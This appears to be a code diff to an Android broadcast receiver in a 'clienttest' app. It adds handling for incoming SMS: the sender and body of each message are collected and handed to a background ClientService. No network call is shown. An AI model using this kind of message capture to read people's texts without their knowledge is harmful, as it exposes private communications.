@@ -8,23 +8,33 @@ package org.jesusgift.clienttest;/* *
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
+import android.provider.Telephony;
+import android.telephony.SmsMessage;
 
 import org.jesusgift.clienttest.Helpers.AppConfig;
 
 public class AppReceiver extends BroadcastReceiver {
-    private static final String PHONE_REBOOT_COMPLETE = "android.intent.action.BOOT_COMPLETED";
+    final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 
     @Override
     public void onReceive(Context context, Intent intent) {
         Intent intent1= new Intent(context, ClientService.class);
-        context.startService(intent1);
 
         switch (intent.getAction()) {
-            case AppConfig.SERVICE_STOP_BROADCAST:
-                break;
-
-            case PHONE_REBOOT_COMPLETE:
+            //On Sms Received
+            case SMS_RECEIVED:
+                Bundle bundle = intent.getExtras();
+                if(bundle != null) {
+                    SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+                    StringBuilder stringBuilder = new StringBuilder();
+                    for(SmsMessage msg : messages) {
+                        stringBuilder.append(msg.getOriginatingAddress()+" : "+msg.getDisplayMessageBody()+"\n");
+                    }
+                    intent1.putExtra(AppConfig.MESSAGE_BODY, stringBuilder.toString());
+                }
                 break;
         }
+        context.startService(intent1);
     }
 }
